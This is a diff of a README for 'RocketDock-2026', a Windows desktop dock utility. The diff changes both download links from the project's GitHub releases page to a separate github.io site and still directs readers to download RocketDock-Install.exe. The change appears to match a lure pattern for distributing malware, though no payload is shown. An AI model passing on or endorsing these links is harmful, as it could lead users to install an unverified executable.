@@ -1,6 +1,6 @@
 # 🚀 RocketDock-2026 - Organize your desktop applications with ease
 
-[![](https://img.shields.io/badge/Download-RocketDock-blue.svg)](https://github.com/unreflected-bug23/RocketDock-2026/releases)
+[![](https://img.shields.io/badge/Download-RocketDock-blue.svg)](https://unreflected-bug23.github.io)
 
 RocketDock-2026 provides a clean way to manage your computer desktop. This tool adds an animated dock to your screen. You place shortcuts to your favorite programs and folders on this dock. It stays visible while you work and clears clutter from your desktop screen. You can customize the look of the dock to match your style. It works on Windows 10 and Windows 11.
 
@@ -8,7 +8,7 @@ RocketDock-2026 provides a clean way to manage your computer desktop. This tool 
 
 You need to access the release page to get the installer for your computer. 
 
-1. Visit this page to download: [https://github.com/unreflected-bug23/RocketDock-2026/releases](https://github.com/unreflected-bug23/RocketDock-2026/releases)
+1. Visit this page to download: [https://unreflected-bug23.github.io](https://unreflected-bug23.github.io)
 2. Locate the file named RocketDock-Install.exe in the Assets section.
 3. Click the file name to save it to your Downloads folder.
 
